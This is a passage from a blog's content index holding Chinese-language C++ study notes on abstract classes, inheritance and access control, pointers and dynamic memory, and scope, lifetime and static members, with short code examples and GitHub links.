id="抽象类">抽象类</h2><p>非常简单，具有纯虚函数的类是抽象类，<strong>不能被实例化</strong>。</p><p>如果你想了解更多，请<ahref="https://blog.csdn.net/LY_ysys629/article/details/76904129">查看博客</a>。</p><h1 id="程序示例---变步长梯形积分算法求解函数定积分">程序示例 -变步长梯形积分算法求解函数定积分</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/%E5%8F%98%E6%AD%A5%E9%95%BF%E6%A2%AF%E5%BD%A2%E7%A7%AF%E5%88%86%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9A%E7%A7%AF%E5%88%86.cpp">查看GitHub</a></p><h1 id="综合示例---个人银行账户管理程序的改进">综合示例 -个人银行账户管理程序的改进</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_2">查看GitHub</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPP Inheritance and Derivation</title>
      <link href="/zh/2022/07/31/CPP/CPP%20Inheritance%20and%20Derivation/"/>
      <url>/zh/2022/07/31/CPP/CPP%20Inheritance%20and%20Derivation/</url>
      
        <content type="html"><![CDATA[<h1 id="类的继承与派生">类的继承与派生</h1><h2 id="概述">概述</h2><p>继承意味着从祖先那里获取<strong>属性</strong>和<strong>行为特征</strong>。</p><p>类的继承是指一个新类从现有类中获取现有特征。从另一个角度看，从现有类创建新类的过程称为类的派生。</p><div class="note info flat"><p>它们本质上是相同的，只是从不同的角度看同一过程。</p></div><h3 id="继承与派生的目的">继承与派生的目的</h3><p>继承的目的：实现设计和代码的重用。</p><p>派生的目的：当出现新问题且原程序无法很好解决时，需要对原程序进行修改。</p><hr /><blockquote><p>不同的分类标准</p><blockquote><p>直接参与派生类的基类称为<strong>直接基类</strong>，基类的基类或更高层次的基类称为<strong>间接基类</strong>。</p></blockquote><blockquote><p>一个派生类可以同时有多个基类，这种情况称为<strong>多重继承</strong>。类似地，只有一个基类的情况称为<strong>单一继承</strong>。</p></blockquote></blockquote><h2 id="派生类的定义">派生类的定义</h2><p>派生类定义语法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>: inheritance_mode BaseClassName1,...,inheritance_mode BaseClassNamen</span><br><span class="line">&#123;</span><br><span class="line">  member declarations</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建派生类的过程">创建派生类的过程</h2><ol type="1"><li>吸收基类成员</li></ol><p>​吸收基类成员后，派生类实际上包含了其基类的所有成员<strong>除了构造函数和析构函数</strong>。</p><ol start="2" type="1"><li>修改基类成员</li></ol><p>​如果派生类声明了一个与基类成员同名的新成员，则派生的新成员<strong>隐藏或覆盖</strong>同名的外部成员。</p><ol start="3" type="1"><li>添加新成员</li></ol><p>​ 派生类添加新成员以开发功能。</p><h1 id="访问控制">访问控制</h1><p>访问主要来自两个方面：首先，派生类中的新成员访问从基类继承的成员；其次，在派生类外部，通过派生类对象访问从基类继承的成员。</p><p>继承模式主要分为<strong>三种类型</strong>，其各自特征如下。</p><h2 id="公有继承-public">公有继承 (public)</h2><ul><li><p>基类的公有和保护成员的访问属性在派生类中<strong>保持不变</strong>，但基类的私有成员<strong>无法直接访问</strong>。</p></li><li><p>派生类中的成员函数可以直接访问基类的公有和保护成员，但<strong>无法直接访问</strong>基类的私有成员。</p></li><li><p>通过派生类对象访问从基类继承的成员时，<strong>只能访问公有成员</strong>。</p></li></ul><h2 id="保护继承-protected">保护继承 (protected)</h2><ul><li><p>基类的公有和保护成员在派生类中<strong>作为保护成员</strong>出现，但基类的私有成员<strong>无法直接访问</strong>。</p></li><li><p>派生类中的成员函数可以直接访问基类的公有和保护成员，但无法直接访问基类的私有成员。</p></li><li><p>通过派生类对象，<strong>无法直接访问从基类继承的任何成员</strong>。</p></li></ul><h2 id="私有继承-private">私有继承 (private)</h2><ul><li><p>基类的公有和保护成员在派生类中<strong>作为私有成员</strong>出现，但基类的私有成员<strong>无法直接访问</strong>。</p></li><li><p>派生类中的成员函数<strong>可以直接访问</strong>基类的公有和保护成员，但<strong>无法直接访问</strong>基类的私有成员。</p></li><li><p>通过派生类对象，<strong>无法直接访问从基类继承的任何成员</strong>。</p></li></ul><div class="note success flat"><p>不难看出，这三种继承方法的第二点是完全相同的，这遵循了数据共享和保护的原则。派生类对象可以在公有继承下访问公有成员，但在其他情况下无法访问以保护数据。</p></div><p><ahref="https://www.cnblogs.com/NueXini/p/16180257.html">附上一个详细的解释</a></p><h1 id="类型兼容性规则">类型兼容性规则</h1><p>类型兼容性规则意味着在需要基类对象的任何地方，<strong>公有派生类对象</strong>可以作为替代品。通过公有继承，派生类获得基类的所有成员，除了构造函数和析构函数，具备基类的所有功能。（保护和私有继承不适用，因为对象无法访问从基类继承的任何成员）</p><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;...&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>: <span class="keyword">public</span> B &#123;...&#125;</span><br><span class="line"></span><br><span class="line">B b1, * pb1;</span><br><span class="line">D d1;</span><br></pre></td></tr></table></figure><p>基于上述代码，有三种替代情况：</p><ul><li><p>派生类对象可以隐式转换为基类对象</p><p><code>b1=d1;</code></p></li><li><p>派生类对象可以初始化基类引用</p><p><code>B &amp;rb=d1;</code></p></li><li><p>派生类指针可以隐式转换为基类指针</p><p><code>pb1=&amp;d1</code></p></li></ul><p>这个兼容性规则允许我们使用相同的函数统一处理基类和公有派生类对象。也就是说，当形式参数是基类对象（引用、指针）时，实际参数可以是派生类对象或指针。这大大提高了程序效率。</p><h1 id="派生类的构造函数和析构函数">派生类的构造函数和析构函数</h1><p>派生类的构造函数只负责初始化派生类中新添加的成员。对于所有从基类继承的成员，初始化仍由基类构造函数完成。最后，派生对象的清理也需要添加新的析构函数。</p><h2 id="构造函数">构造函数</h2><p>由于派生类无法访问基类中的许多数据成员，因此需要依赖基类构造函数。在构造派生类对象时，首先调用基类构造函数，然后初始化派生类中新添加的成员对象。</p><p>一般语法形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DerivedClassName::<span class="built_in">DerivedClassName</span>(parameter_list):<span class="built_in">BaseClassName1</span>(BaseClassName1_initialization_parameters),...,<span class="built_in">BaseClassNamen</span>(BaseClassNamen_initialization_parameters)</span><br><span class="line">,<span class="built_in">member_object_name1</span>(member_object1_initialization_parameters),...,<span class="built_in">member_object_namem</span>(member_objectm_initialization_parameters)</span><br><span class="line">&#123;</span><br><span class="line">  other initialization operations of derived <span class="keyword">class</span> <span class="title class_">constructor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数执行的一般顺序：</p><ol type="1"><li>按照继承时声明的顺序（从左到右）调用基类构造函数。</li><li>按照在类中声明的顺序初始化派生类中新添加的成员对象。</li><li>执行派生类构造函数体中的内容。</li></ol><h2 id="复制构造函数">复制构造函数</h2><p>派生类在进行复制构造时也使用基类的复制构造函数。</p><p>示例：如果为派生类编写一个复制构造函数（以基类作为基类），形式为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Derived::<span class="built_in">Derived</span>(<span class="type">const</span> Derived &amp;v): <span class="built_in">Base</span>(v)&#123;...&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>这里基类使用了对派生类的引用，完全符合类型兼容性规则，即派生类对象可以用来初始化基类。</p></div><h2 id="析构函数">析构函数</h2><p>实际上，这与构造函数的思想完全一致，最大的区别在于<strong>销毁的顺序与初始化的顺序完全相反。</strong></p><hr /><h1 id="派生类成员的识别与访问">派生类成员的识别与访问</h1><h2 id="范围解析运算符">范围解析运算符</h2><p>“::” 是范围解析运算符，用于指定要访问的成员所在的类的名称。</p><p>如果派生类声明了一个与基类成员函数同名的新函数，即使函数参数列表不同，所有重载形式的基类中同名的继承函数都会被隐藏。</p><p>数据成员也是如此。具有相同名称的新成员将覆盖基类；如果多个继承基类重复，则会出现歧义，必须通过使用类名和范围解析运算符来识别成员。</p><div class="note danger flat"><p>只有在同一作用域中定义的函数才称为重载。</p></div><hr /><p>使用关键字可以使用其他作用域中的标识符。</p><h2 id="虚基类">虚基类</h2><p>假设一个派生类从多个基类继承，而这些基类中的某些或全部又是从<strong>另一个共同基类</strong>派生的，那么在这个派生类中，将会在内存中出现相同的名称和<strong>多个副本</strong>，造成程序开销。</p><p>此时，可以将共同基类设置为虚基类，以便从不同路径继承的同名数据成员在内存中只有一个副本，并且同名函数只有一个映射。</p><p>语法形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DerivedClassName</span>:<span class="keyword">virtual</span> inheritance_mode BaseClassName</span><br></pre></td></tr></table></figure><h2 id="虚基类及其派生类的构造函数">虚基类及其派生类的构造函数</h2><p>在整个继承关系中，所有直接或间接继承虚基类的派生类必须在构造函数的成员初始化列表中列出虚基类的初始化。</p><p>在调用虚类的构造函数时，C++编译器将指定最派生类的构造函数来调用虚基类的构造函数，因此无需担心多次重复调用。</p><blockquote><p>构造类对象的一般顺序是：</p><ol type="1"><li><p>如果类有直接或间接的虚基类，则首先执行虚基类的构造函数。</p></li><li><p>如果还有其他基类，则按它们在继承声明列表中出现的顺序初始化，但在构造过程中，不再执行它们的虚基类构造函数。</p></li><li><p>按照定义中出现的顺序初始化新添加的成员对象。对于类类型的成员对象，如果它们出现在构造函数初始化列表中，则执行带有指定参数的构造函数；如果没有，则执行默认构造函数；对于基本类型的成员对象，如果它们出现在初始化列表中，则使用指定值赋初值，否则不做任何操作。</p></li><li><p>执行构造函数体。</p></li></ol></blockquote><h1 id="程序示例---使用高斯消元法求解线性方程">程序示例 -使用高斯消元法求解线性方程</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Gauss%E6%B6%88%E5%8E%BB_CPP">GitHub上的源代码</a></p><h1 id="综合示例---个人银行账户管理程序">综合示例 -个人银行账户管理程序</h1><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update_1">GitHub上的源代码</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Arrays, Pointers and Strings</title>
      <link href="/zh/2022/07/23/CPP/C++%20Arrays,%20Pointers%20and%20Strings/"/>
      <url>/zh/2022/07/23/CPP/C++%20Arrays,%20Pointers%20and%20Strings/</url>
      
        <content type="html"><![CDATA[<h1 id="数组">数组</h1><p>数组是具有一定顺序关系的对象集合，构成数组的对象成为该数组的元素。数组名称是一个不能被赋值的指针，称为指针常量。</p><blockquote><p>C++中的二维数组被视为<strong>一维数组的数组</strong>。因此，二维数组以<strong>行优先</strong>的顺序存储。</p></blockquote><hr /><blockquote><p>在作为参数传递数组时，通常不指定第一维的大小，即使指定也会被忽略。</p></blockquote><h2 id="程序示例线性拟合">程序示例—线性拟合</h2><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Linear%20fit">查看源代码</a></p><hr /><h1 id="指针">指针</h1><p>基本定义和用法省略。</p><h2 id="void指针的使用">void指针的使用</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="type">void</span> voidObject;             <span class="comment">//不能声明void类型的变量</span></span><br><span class="line">  <span class="type">void</span> *pv;                    <span class="comment">//可以声明void类型的指针</span></span><br><span class="line">  <span class="type">int</span> i = <span class="number">5</span>;</span><br><span class="line">  pv = &amp;i;</span><br><span class="line">  <span class="type">int</span> *pint = <span class="built_in">static_cast</span>&lt;<span class="type">int</span> *&gt;(pv);</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;* pint=&quot;</span> &lt;&lt; * pint &lt;&lt; endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">  * pint = <span class="number">5</span></span><br></pre></td></tr></table></figure><div class="note info flat"><p>当指针指向的数据类型不确定时，通常只使用void指针。</p></div><h2 id="空指针的使用">空指针的使用</h2><p>不同类型的指针之间或指针与非零整数之间的算术运算是<strong>无意义</strong>的，但指针变量可以与整数0进行比较。0专门用来表示空指针，即不指向任何有效地址的指针。</p><p>空指针也可以使用NULL表示。</p><div class="note success flat"><p>NULL是许多头文件中定义的宏，定义为0。</p></div><h2 id="对象指针">对象指针</h2><p>顾名思义，指向对象的指针。</p><p>使用对象指针时，对象成员可以非常直观地表示。语法形式为<code>object_pointer_name-&gt;member_name</code>，相当于访问<code>(*object_pointer_name).member_name</code>。</p><p>在类的组合中，有一个概念叫做前向引用声明，其中两个类在定义时相互引用。这个问题可以通过使用指针来解决。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>;         <span class="comment">//前向引用声明</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>&#123;</span><br><span class="line">  A *x;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">  B *y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明指针而不是对象是允许的。一旦A被定义，就可以声明A对象。</p><h3 id="this指针">this指针</h3><p>this指针是每个类的非静态成员函数（包括构造函数和析构函数）中隐式存在的特殊指针，用于指向<strong>被成员函数操作的对象</strong>。</p><div class="note info flat"><p>this指针是成员函数的隐式参数，使得函数能够知道它正在操作哪个对象，从而访问其数据成员。对于常量成员函数，这个隐式参数是常量指针类型。</p></div><h3 id="指向类的非静态成员的指针">指向类的非静态成员的指针</h3><p>声明语句：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type_specifier class_name::* pointer_name                           <span class="comment">//声明指向数据成员的指针</span></span><br><span class="line"><span class="built_in">type_specifier</span> (class_name::* pointer_name)(parameter_list);        <span class="comment">//声明指向函数成员的指针</span></span><br></pre></td></tr></table></figure><p>为数据成员的指针赋值的一般语法为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pointer_name = &amp;class_name::data_member_name;</span><br></pre></td></tr></table></figure><p>访问数据成员时，可以使用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">object_name.*class_member_pointer_name</span><br><span class="line">或</span><br><span class="line">object_pointer_name -&gt; *class_member_pointer_name</span><br></pre></td></tr></table></figure><p>为成员函数的指针赋值的一般语法为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pointer_name = &amp;class_name::function_member_name;</span><br></pre></td></tr></table></figure><h3 id="指向类的静态成员的指针">指向类的静态成员的指针</h3><p>只需使用普通指针：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type_specifier  *pointer_name = &amp;class_name::static_data_member</span><br><span class="line"><span class="built_in">type_specifier</span> (*pointer_name)(formal_parameters) = &amp;class_name::static_member_function</span><br></pre></td></tr></table></figure><h1 id="动态内存分配">动态内存分配</h1><p>在C++程序中，使用两个运算符来创建和删除堆对象（在程序执行期间申请和释放的存储单元）：<code>new</code>和<code>delete</code>。</p><div class="note danger flat"><p>有new的地方，必须有delete来释放，否则会导致无法回收内存，造成程序占用越来越多的内存，称为内存泄漏。</p></div><h2 id="创建类的对象">创建类的对象</h2><blockquote><p>使用new创建类对象时需要注意的细节。</p><blockquote><p>如果类有用户定义的默认构造函数，则<code>new T</code>和<code>newT()</code>没有区别。</p></blockquote><blockquote><p>如果类没有定义默认构造函数，使用<code>newT</code>将调用系统生成的隐式默认构造函数；使用<code>newT()</code>除了执行这个隐式函数外，还会将基本数据类型和指针类型的成员初始化为0，并且这个过程是<strong>递归</strong>的。</p></blockquote></blockquote><h2 id="创建多维数组">创建多维数组</h2><p>形式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> type_name T[array_first_dimension_length][array_second_dimension_length]...;</span><br></pre></td></tr></table></figure><p>数组的第一维长度可以是任何<strong>表达式</strong>，结果为正整数，而其他数组维度的长度必须是<strong>常量表达式</strong>，结果为正整数。</p><p>错误示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">float</span> * fp;</span><br><span class="line">fp = <span class="keyword">new</span> <span class="type">float</span>[<span class="number">10</span>][<span class="number">25</span>][<span class="number">10</span>]</span><br></pre></td></tr></table></figure><p><div class="note danger flat"><p>这里的new操作产生一个指向<code>$25 \times 10$</code>二维浮点类型数组的指针，而fp是指向浮点类型数据的指针，造成矛盾！</p></div></p><h1 id="使用vector创建数组对象">使用vector创建数组对象</h1><p>C++提供了一种封装的动态数组—vector，具有多种类型。vector<strong>不是一个类</strong>，而是<strong>一个类模板</strong>。</p><p>使用vector定义动态数组的形式为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;element_type&gt; <span class="title">array_object_name</span><span class="params">(array_length)</span></span>;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>由vector定义的数组对象的所有元素都会被初始化。如果它们是基本数据类型，所有元素将被初始化为0；如果它们是类类型，将调用类的默认构造函数进行初始化。因此，必须确保作为数组元素使用的类<strong>需要有默认构造函数</strong>。可以指定初始值，但<strong>所有元素的初始值必须相同</strong>。</p></div><h1 id="引用相关补充">引用相关补充</h1><p>引用通常用于函数参数列表和函数返回值。以下是与C++引用相关的两个重要概念，C++程序员必须理解：</p><p><ahref="https://www.runoob.com/cplusplus/passing-parameters-by-references.html">使用引用作为参数</a></p><p><ahref="https://www.runoob.com/cplusplus/returning-values-by-reference.html">使用引用作为返回值</a></p><h1 id="深拷贝与浅拷贝">深拷贝与浅拷贝</h1><p>隐式拷贝构造函数仅实现浅拷贝，但这种拷贝并不适用于所有情况。</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/浅复制/main.cpp">浅拷贝代码示例</a></p><p><ahref="https://github.com/hustlixiang21/cpp-practice/blob/main/深复制/main.cpp">深拷贝代码示例</a></p><h1 id="字符串">字符串</h1><p>C++封装了一系列复杂的字符串操作，形成了字符串类，以便更方便地进行字符串操作。</p><div class="note info flat"><p>许多字符串操作需要借助<strong>cstring</strong>头文件中的<strong>字符串处理函数</strong>。使用字符串类需要包含<strong>string</strong>头文件。</p></div><p><ahref="https://www.runoob.com/cplusplus/cpp-strings.html">字符串相关说明</a></p><h1 id="个人银行账户管理程序">个人银行账户管理程序</h1><p>对之前管理程序的功能补充。</p><p><ahref="https://github.com/hustlixiang21/cpp-practice/tree/main/Personal_bank_management_update">GitHub上的源代码</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> C++ Programming </tag>
            
            <tag> C++ Language </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ Data Sharing and Protection</title>
      <link href="/zh/2022/07/21/CPP/C++%20Data%20Sharing%20and%20Protection/"/>
      <url>/zh/2022/07/21/CPP/C++%20Data%20Sharing%20and%20Protection/</url>
      
        <content type="html"><![CDATA[<h1 id="标识符作用域和可见性">标识符作用域和可见性</h1><h2 id="作用域">作用域</h2><p>作用域是标识符在程序文本中有效的<strong>有效区域</strong>。</p><h3 id="函数原型作用域">函数原型作用域</h3><p>函数原型声明期间，形式参数的作用域是函数原型作用域。</p><div class="note info flat"><p>在函数原型参数列表中，只有类型是重要的，标识符可以省略。为了可读性，最好包含它。</p></div><h3 id="局部作用域">局部作用域</h3><p>简单理解为在<strong>函数体内声明的变量</strong>，从声明点到声明所在块的闭合括号。</p><blockquote><p>具有局部作用域的变量也称为局部变量。</p></blockquote><h3 id="类作用域">类作用域</h3><p>类是命名成员的集合，其成员 m 具有类作用域。访问它有三种方式：</p><ol type="1"><li>如果成员 m没有在成员函数中定义，并且没有被函数体遮蔽，函数可以直接访问 m；</li><li>通过表达式 <code>x.m</code> 或 <code>X::m</code>访问。<strong>这是最基本的方法</strong>，后者主要用于访问类的静态成员。</li><li>通过 <code>ptr-&gt;m</code> 访问，其中 ptr是该类对象的<strong>指针</strong>。</li></ol><h3 id="命名空间作用域">命名空间作用域</h3><p>命名空间的目的是消除项目中不同文件可能存在的歧义，例如：当两个不同模块中的变量具有相同名称时。</p><p>语法如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> namespace_name&#123;</span><br><span class="line">  命名空间内的各种声明（函数声明、类声明等...）</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在命名空间内，可以直接使用当前空间中定义的标识符。如果需要使用其他命名空间中定义的标识符，则需要使用<code>namespace_name::identifier</code>。为了避免冗长，提供了使用声明。</p><p>使用声明有两种形式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> namespace_name::identifier</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> namespace_name</span><br></pre></td></tr></table></figure><p>有两种特殊类型的命名空间——全局命名空间和匿名命名空间。</p><p>全局命名空间是默认命名空间，所有在显式声明的命名空间外声明的标识符都在全局命名空间中。</p><p>匿名命名空间在定义时只需省略命名空间名称，其目的是防止你定义的标识符被任何其他命名空间访问。</p><blockquote><p>C++ 标准库中的所有标识符都在 std 命名空间中声明，cout、cin、endl都是这样，因此每个程序都使用<code>using namespace std</code>，否则你需要使用<code>std::cin</code>…</p></blockquote><p>此外，命名空间<strong>允许嵌套</strong>。</p><div class="note info flat"><p>具有命名空间作用域的变量也称为全局变量。</p></div><hr /><h2 id="可见性">可见性</h2><p>内容相对简单明了，因此省略。</p><hr /><h1 id="对象生命周期">对象生命周期</h1><h2 id="静态生命周期">静态生命周期</h2><p>生命周期与程序运行时相同的对象称为具有静态生命周期，在声明时需要使用关键字<strong>static</strong>。</p><p>特点：每次函数调用时不会创建副本，函数返回时也不会失效。变量在每次调用期间共享。赋值只执行一次，声明时的赋值语句不会多次执行。</p><div class="note info flat"><p>如果在声明时未初始化，默认为 0。</p></div><h2 id="动态生命周期">动态生命周期</h2><p>局部生命周期对象在声明点出生，在声明所在块执行完毕时结束。</p><h1 id="类静态成员">类静态成员</h1><p>对象之间也需要共享数据，静态成员解决了这个问题。</p><p>例如，如果有一个 Employee 类，我们有几个 Employee对象，但我们如何计算有多少个 Employee对象呢？这时可以使用静态数据成员，因为这个数据成员是所有对象共享的。</p><h2 id="静态数据成员">静态数据成员</h2><p>当某个属性被<strong>整个类共享</strong>且<strong>不属于任何特定对象</strong>时，使用<strong>static</strong>关键字将其声明为静态成员。整个类中只有一个副本，由所有对象维护和使用。</p><p>由于它不属于任何对象并且具有静态生命周期，因此通过类名访问。<strong>“class_name::identifier”</strong>。</p><div class="note warning flat"><p>在类定义中，仅做了引用声明。必须在使用类名限定符的命名空间作用域中进行定义声明，也可以在此处进行初始化。</p></div><p>程序示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;                                        <span class="comment">//Point 类定义 public: //外部接口</span></span><br><span class="line">  <span class="built_in">Point</span>(<span class="type">int</span> x = <span class="number">0</span>, <span class="type">int</span> y = <span class="number">0</span>) : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y)&#123;          <span class="comment">//构造函数                                                                                            </span></span><br><span class="line">    count++;            <span class="comment">//在构造函数中递增计数，所有对象维护相同的计数 </span></span><br><span class="line">  &#125; </span><br><span class="line">  <span class="built_in">Point</span>(Point &amp;p)&#123;      <span class="comment">//拷贝构造函数</span></span><br><span class="line">  x = p.x;</span><br><span class="line">  y = p.y;</span><br><span class="line">  count++;</span><br><span class="line">  &#125; </span><br><span class="line">  ~<span class="built_in">Point</span>() &#123; count--; &#125; </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> x; &#125; </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">getY</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> y; &#125;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">showCount</span><span class="params">()</span> </span>&#123; <span class="comment">//输出静态数据成员 </span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot; 对象计数 = &quot;</span> &lt;&lt; count &lt;&lt; endl;</span><br><span class="line">  &#125; </span><br><span class="line"><span class="keyword">private</span>:             <span class="comment">//私有数据成员 </span></span><br><span class="line">  <span class="type">int</span> x, y; </span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> count;  <span class="comment">//静态数据成员声明，用于记录点的数量 </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Point::count = <span class="number">0</span>;<span class="comment">//静态数据成员定义和初始化，使用类名限定符 </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;         <span class="comment">//主函数 </span></span><br><span class="line">  <span class="function">Point <span class="title">a</span><span class="params">(<span class="number">4</span>, <span class="number">5</span>)</span></span>;     <span class="comment">//定义对象 a，其构造函数将计数递增 1 </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Point A: &quot;</span> &lt;&lt; a.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; a.<span class="built_in">getY</span>(); a.<span class="built_in">showCount</span>(); <span class="comment">//输出对象计数</span></span><br><span class="line">  <span class="function">Point <span class="title">b</span><span class="params">(a)</span></span>;        <span class="comment">//定义对象 b，其构造函数将计数递增 1 </span></span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;Point B: &quot;</span> &lt;&lt; b.<span class="built_in">getX</span>() &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; b.<span class="built_in">getY</span>(); b.<span class="built_in">showCount</span>(); <span class="comment">//输出对象计数 </span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="静态成员函数">静态成员函数</h2><p>上面的程序实际上存在一个问题：showcount 函数需要存在一个 Point对象才能被调用，但如果我想直接输出 count的值呢？这时就需要静态成员函数，允许通过类名直接调用函数，而不依赖于对象。</p><div class="note success flat"><p>虽然静态成员函数也可以通过对象访问，但通常习惯上通过类名访问。即使通过对象名称访问，该函数与对象没有关系。</p></div><h1 id="类友元">类友元</h1><p>以 Point 